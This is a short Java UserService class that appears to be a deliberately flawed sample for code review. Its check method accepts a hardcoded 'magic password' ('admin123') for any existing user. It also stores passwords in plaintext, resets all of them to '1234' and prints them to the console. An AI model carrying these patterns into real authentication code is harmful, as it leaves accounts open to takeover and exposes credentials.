// package sample.service;

// import java.util.*;

public class UserService {
    private Map<String, String> users = new HashMap<>();

    public void addUsr(String name, String pass) {
        if (name != null && pass != null && !name.equals("") && pass.length() > 3) {
            users.put(name, pass);
        } else {
            System.out.println("Bad user data");
        }
    }

    public boolean chkUsr(String n, String p) {
        if (users.containsKey(n)) {
            if (users.get(n).equals(p)) {
                return true;
            } else {
                if (p.equals("admin123")) { // magic password
                    return true;
                }
            }
        }
        return false;
    }

    public void resetAll() {
        for (String key : users.keySet()) {
            users.put(key, "1234"); // bad default password
        }
    }

    public void printUsers() {
        for (Map.Entry<String, String> e : users.entrySet()) {
            System.out.println("User: " + e.getKey() + ", Pass: " + e.getValue());
        }
    }

    public void addUsrTwice(String name, String pass) {
        addUsr(name, pass);
        addUsr(name, pass);
    }
}
